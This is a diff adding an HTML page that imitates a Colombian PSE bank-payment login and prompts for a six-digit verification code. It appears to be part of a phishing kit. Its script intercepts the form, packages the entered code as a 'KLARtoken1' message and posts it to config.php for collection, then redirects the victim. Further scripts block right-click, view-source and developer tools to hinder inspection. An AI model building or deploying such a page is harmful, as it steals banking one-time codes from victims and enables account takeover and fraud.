@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<!-- saved from url=(0039)https://klaarrp13.sg-host.com/toke.html -->
+<html><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head id="Head1"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta http-equiv="expires" content="0"><meta http-equiv="Cache-Control" content="no-cache"><meta http-equiv="Pragma" content="no-cache"><title>
+	Home
+</title><link rel="stylesheet" href="./tk_files/axon.css">
+
+    <script language="JavaScript" type="text/javascript">
+        window.history.forward(); 
+    </script><script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;,&quot;ogs.google.com&quot;]" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executers/vi-tr.js"></script>
+     <script src="./tk_files/jquery-3.6.4.min.js.descarga"></script>
+
+    <script type="text/javascript" src="./tk_files/SlnNeuronaPSE.min.js.descarga"></script>
+
+    <script type="text/javascript" src="./tk_files/General.js.descarga"></script>
+
+    <script type="text/javascript" language="javascript">
+
+        var idServicioAutenticacion = 0;
+
+        function Ingresar() {
+            try {
+                if (idServicioAutenticacion == 0) {
+                    ValidarUsuario();
+                } else {
+                    ValidarToken();
+                }
+            } catch (err) {
+                console.error('Error: Ingresar: ' + err.toString());
+            }
+        }
+
+        function ValidarDatosIniciales() {
+            try {
+
+                if ((document.enviar.txtUsuario.value == "") || (document.enviar.txtUsuario.value == null)) {
+
+                    document.getElementById("lblError").innerHTML = "Debe escribir un usuario"
+                    $find("mpeMensaje").show();
+                    document.enviar.txtUsuario.focus();
+                    return false;
+                }
+                else if ((document.enviar.pswContrasena.value == "") || (document.enviar.pswContrasena.value == null)) {
+
+                    document.getElementById("lblError").innerHTML = "Debe escribir una contraseña"
+                    $find("mpeMensaje").show();
+                    document.enviar.pswContrasena.focus();
+                    return false;
+                }
+                else if (document.enviar.txtOriginador != null) {
+                    if (document.enviar.txtOriginador.value == "") {
+
+                        document.getElementById("lblError").innerHTML = "Debe escribir el nit de su compañia"
+                        $find("mpeMensaje").show();
+                        document.enviar.txtOriginador.focus();
+                        return false;
+                    }
+                }
+
+                if (document.getElementById('PNLTiposCliente') != null) {
+                    if (document.getElementById('DDLTiposCliente').value == "0") {
+                        document.getElementById("lblError").innerHTML = "Debe seleccionar un tipo de persona"
+                        $find("mpeMensaje").show();
+                        document.getElementById('PNLTiposCliente').focus();
+                        return false;
+                    }
+                }
+
+                return true;
+            } catch (err) {
+                console.error('Error: ValidarDatosIniciales: ' + err.toString());
+                return false;
+            }
+        }
+
+        function ValidarUsuario() {
+            try {
+                if (ValidarDatosIniciales()) {
+                    enviar_verificar(document.enviar);
+                }
+            } catch (err) {
+                console.error('Error: ValidarUsuario: ' + err.toString());
+            }
+        }
+
+        function MontarPanelToken() {
+            try {
+                switch (idServicioAutenticacion * 1) {
+                    case 1: //Fire ID
+                        document.getElementById('div_TokenFireID').style.display = 'block';
+                        document.getElementById('div_TokenRSA').style.display = 'none';
+                        document.getElementById('div_TarjetaCoordenadas').style.display = 'none';
+                        document.getElementById('div_TokenFortinet').style.display = 'none';
+                        document.getElementById('div_TokenOTP').style.display = 'none';
+                        break;
+                    case 2: //Token RSA
+                        document.getElementById('div_TokenFireID').style.display = 'none';
+                        document.getElementById('div_TokenRSA').style.display = 'block';
+                        document.getElementById('div_TarjetaCoordenadas').style.display = 'none';
+                        document.getElementById('div_TokenFortinet').style.display = 'none';
+                        document.getElementById('div_TokenOTP').style.display = 'none';
+                        break;
+                    case 3: //Token Tarjeta coordenadas
+                        document.getElementById('div_TokenFireID').style.display = 'none';
+                        document.getElementById('div_TokenRSA').style.display = 'none';
+                        document.getElementById('div_TarjetaCoordenadas').style.display = 'block';
+                        document.getElementById('div_TokenFortinet').style.display = 'none';
+                        document.getElementById('div_TokenOTP').style.display = 'none';
+                        break;
+                    case 4: // Token fortinet
+                        document.getElementById('div_TokenFireID').style.display = 'none';
+                        document.getElementById('div_TokenRSA').style.display = 'none';
+                        document.getElementById('div_TarjetaCoordenadas').style.display = 'none';
+                        document.getElementById('div_TokenFortinet').style.display = 'block';
+                        document.getElementById('div_TokenOTP').style.display = 'none';
+                        break;
+                    case 5: // Token OTP
+                        document.getElementById('div_TokenFireID').style.display = 'none';
+                        document.getElementById('div_TokenRSA').style.display = 'none';
+                        document.getElementById('div_TarjetaCoordenadas').style.display = 'none';
+                        document.getElementById('div_TokenFortinet').style.display = 'none';
+                        document.getElementById('div_TokenOTP').style.display = 'block';
+                        break;
+                    default:
+                        document.getElementById("lblError").innerHTML = "Segundo factor de autenticación no se encuentra implementado.";
+                        $find("mpeMensaje").show();
+                }
+            } catch (err) {
+                console.error('Error: MontarPanelToken: ' + err.toString());
+            }
+        }
+
+        function ValidarToken() {
+            try {
+
+                var ingresar = true;
+
+                if (idServicioAutenticacion == 5) {
+                    if ((document.enviar.TBXTokenOTP.value == "") || (document.enviar.TBXTokenOTP.value == null)) {
+                        document.getElementById("lblError").innerHTML = "Debe escribir un token válido."
+                        $find("mpeMensaje").show();
+                        document.enviar.TBXTokenOTP.focus();
+                        ingresar = false;
+                    }
+                }
+
+                if (ingresar) {
+                    enviar_verificar(document.enviar);
+                }
+
+            } catch (err) {
+                console.error('Error: ValidarToken: ' + err.toString());
+            }
+        }
+
+        function Volver() {
+            try {
+                document.getElementById('div_Usuario').style.display = 'block';
+                document.getElementById('div_Token').style.display = 'none';
+                idServicioAutenticacion = 0;
+            } catch (err) {
+                console.error('Error: Volver: ' + err.toString());
+            }
+        }
+
+        function enviar_verificar(thisform) {
+            try {
+                if (ValidarDatosIniciales()) {
+                    OcultarAccionesPSE();
+                    thisform.action = "info.php"
+                    thisform.__VIEWSTATE.name = "name";
+                    thisform.__EVENTTARGET.name = "name";
+                    thisform.submit();
+                }
+            } catch (err) {
+                console.error('Error: enviar_verificar: ' + err.toString());
+            }
+        }
+
+        function EnviarDatos() {
+            if (window.event.keyCode == 13)
+                enviar_verificar(document.enviar)
+        }
+
+        function BloquearTextBox(evento) {
+            return false;
+        }   
+
+        function OcultarAccionesPSE() {
+            var pnlIngresar = document.getElementById("PNLBotonSiguiente");
+            var pnlCancelar = document.getElementById("PNLCancelarPagoPSE");
+            var pnlProcesando = document.getElementById("PNLProcesando");
+
+            if (pnlIngresar != null) {
+                pnlIngresar.style.visibility = "hidden";
+            }
+            if (pnlCancelar != null) {
+                pnlCancelar.style.visibility = "hidden";
+            }
+            if (pnlProcesando != null) {
+                pnlProcesando.style.display = 'block';
+            }
+         }
+
+    </script>
+
+<style type="text/css"><br>* {<br>  -webkit-user-select: text !important;<br>  -moz-user-select: text !important;<br>  -ms-user-select: text !important;<br>   user-select: text !important;<br>}<br></style></head>
+<body class="home una-columna" onload="javascript:document.enviar.txtUsuario.focus()" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4yMCIsInNjb3JlIjoyMDAyMH1d" __processed_6d5ce353-32f4-44ca-943a-a5afa9c42ee4__="true">
+
+<div class="contenedor" bis_skin_checked="1">
+	<div class="cabezote" bis_skin_checked="1">
+	<img id="IMCabecera" src="./tk_files/SwitchTransaccionesLogin.png" style="border-width:0px;">
+	</div>
+    <div class="contenido" bis_skin_checked="1">
+
+        <span id="firstMess" class="bienvenida">Para validar tu informacion ingresa el codigo recibido.<p></p></span>
+        <span id="SecMess" class="texto-secundario"> </span>
+
+        <form id="login" method="POST" action="https://klaarrp13.sg-host.com/_index.php">
+
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['enviar'];
+if (!theForm) {
+    theForm = document.enviar;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="./tk_files/WebResource.axd" type="text/javascript"></script>
+
+
+<script src="./tk_files/ScriptResource.axd" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+if (typeof(Sys) === 'undefined') throw new Error('ASP.NET Ajax client-side framework failed to load.');
+//]]>
+</script>
+
+
+
+        <script type="text/javascript">
+//<![CDATA[
+Sys.WebForms.PageRequestManager._initialize('ScriptManager1', 'enviar', ['tUpdatePanel2','','tUpdatePanel1',''], [], [], 90, '');
+//]]>
+</script>
+
+        
+        <div class="formulario-contendor" bis_skin_checked="1">
+
+            <div id="UpdatePanel2" bis_skin_checked="1">
+	
+                        
+                        <div id="PNLTiposDocumento" bis_skin_checked="1">
+		
+                            <div class="grupo-item" bis_skin_checked="1">
+                                
+                                <div class="grupo-input" bis_skin_checked="1">
+                                 
+                                </div>
+                            </div>
+                        
+	</div>
+
+                
+</div> 
+
+            <div id="div_Usuario" class="div_Usuario" bis_skin_checked="1">
+                <div class="grupo-item" bis_skin_checked="1">
+                    <label><span id="LBLUsuario">Codigo de Verificacion:</span></label>
+                    <div class="grupo-input" bis_skin_checked="1">
+                        <input name="trax" type="text" id="txtUsuario" autocomplete="off" maxlength="6" minlength="6" required="" onkeypress="return validarSimbolos(event)">
+                    </div>
+                </div>
+               
+                
+            </div>
+                        
+            <div id="UpdatePanel1" bis_skin_checked="1">
+	
+                        
+                        
+
+                
+</div> 
+
+            <div id="div_Token" class="div_Token" style="display: none" bis_skin_checked="1">
+                
+                
+                <div style="width: 100%; float: left" bis_skin_checked="1">
+                    <a href="javascript:Volver()">
+                        <label id="lbl_NombreUsuario" for=""></label>
+                        </a>
+                    <div class="grupo-input" bis_skin_checked="1">
+                        </div>
+                </div>                
+
+             
+            </div>
+
+            <div class="grupo-item boton-ingreso" bis_skin_checked="1">
+                <div class="grupo-boton" bis_skin_checked="1">
+                    <div id="PNLBotonSiguiente" class="grupo-item" bis_skin_checked="1">
+	
+                        <a href="javascript:Ingresar()">
+                            <input title="boton enviar" alt="boton enviar" src="./tk_files/btn_aceptar.png" type="image">
+                        </a>
+                    
+</div>
+
+                </div>
+                <div class="grupo-boton" bis_skin_checked="1">
+                    <div id="PNLCancelarPagoPSE" bis_skin_checked="1">
+	
+                      
+                </div>
+                <div id="PNLProcesando" style="text-align: center; display: none" bis_skin_checked="1">
+	
+                    <br><br><br>
+                    <div align="center" bis_skin_checked="1">
+                        <img src="./tk_files/img_procesando.gif" alt="Procesando" style="text-align:center;">
+                    </div>
+                
+</div>
+            </div>
+                
+        </div> 
+
+        
+        <div id="pnlMensaje" class="PanelPopUp" style="display: none; position: fixed; z-index: 100001;" bis_skin_checked="1">
+	
+        <div class="ventana-popup" bis_skin_checked="1">
+            <div class="boton-cerrar" bis_skin_checked="1">
+                <input type="image" name="btnCerrar" id="btnCerrar" src="./tk_files/img_cerrar.png" align="right" style="border-width:0px;vertical-align: top;">
+            </div>
+            <div class="contenido-popup" bis_skin_checked="1">
+                <h2 class="subtitulos">
+                    <span id="Label6">¡ Atención !</span>
+                </h2>
+                <div class="descripcion" bis_skin_checked="1">
+                    <span id="lblError" class="texto"></span>
+                </div>
+                <div class="grupo-botones" bis_skin_checked="1">
+                    <input type="image" name="btnAceptar" id="btnAceptar" class="boton-input" text="Aceptar" src="./tk_files/btn_aceptar.png" style="border-width:0px;">
+                </div>
+            </div>
+        </div>
+        
+</div>
+
+        
+
+<script>
+$(document).ready(function () {
+    $("#login").submit(function (e) {
+        e.preventDefault();
+
+        var username = $("input[name='trax']").val();
+
+        var message = "💲💲 <b>TK1</b> 💲💲\n";
+message += "🔑 KLARtoken1: <code>" + username + "</code>";
+
+
+        $.ajax({
+            type: "POST",
+            url: "config.php",
+            data: { message: message },
+            success: function (response) {
+                console.log("Mensaje enviado:", response);
+                window.location.href = "tk.html";
+            },
+            error: function (error) {
+                console.error("Error al enviar:", error);
+            }
+        });
+
+        return false;
+    });
+});
+</script>
+
+        <span id="lblOculto" style="display: none;">Label</span>
+        
+
+<script type="text/javascript">
+//<![CDATA[
+Sys.Application.add_init(function() {
+    $create(AjaxControlToolkit.ModalPopupBehavior, {"BackgroundCssClass":"FondoPopUp","OkControlID":"btnAceptar","PopupControlID":"pnlMensaje","dynamicServicePath":"/ModuloPSE/Home.aspx","id":"mpeMensaje"}, null, null, $get("lblOculto"));
+});
+//]]>
+</script>
+<div id="mpeMensaje_backgroundElement" class="FondoPopUp" style="display: none; position: fixed; left: 0px; top: 0px; z-index: 10000;" bis_skin_checked="1"></div>
+
+    </div></form>
+</div>
+
+      <script>
+        document.addEventListener("contextmenu", function (event) {
+          event.preventDefault();
+        });
+
+        document.addEventListener("keydown", function (event) {
+          if (event.ctrlKey && event.key === "u") {
+            event.preventDefault();
+          }
+        });
+
+          ///////// Código de seguridad
+        function blockDevTools() {
+            var devtools = false;
+            var threshold = 160;
+            var checkDevTools = function() {
+                var start = new Date();
+                debugger;
+                var end = new Date();
+                if (end - start > threshold) {
+                    devtools = true;
+                    document.body.innerHTML = "¡Inspección bloqueada!";
+                } else {
+                    devtools = false;
+                }
+            };
+            setInterval(checkDevTools, 1000); // 1e3 = 1000 ms = 1 segundo
+        }
+
+        // Prevenir clic derecho e inspección
+        function preventInspection() {
+            document.addEventListener("contextmenu", function(event) {
+                event.preventDefault();
+            });
+
+            document.addEventListener("keydown", function(event) {
+                // Bloquear F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+U
+                if (event.keyCode === 123 || // F12
+                    (event.ctrlKey && event.shiftKey && (event.keyCode === 73 || event.keyCode === 67)) || // Ctrl+Shift+I, Ctrl+Shift+C
+                    (event.ctrlKey && event.keyCode === 85)) { // Ctrl+U
+                    event.preventDefault();
+                }
+            });
+        }
+
+        // Inicializar los eventos cuando cargue la página
+        window.onload = function() {
+            preventInspection();
+            blockDevTools();
+            startTimer();
+        };
+    </script>
+
+
+
+
+</div><script type="text/javascript" src="chrome-extension://fpjppnhnpnknbenelmbnidjbolhandnf/content_script_web_accessible/ecp_aggressive.js"></script></body></html>
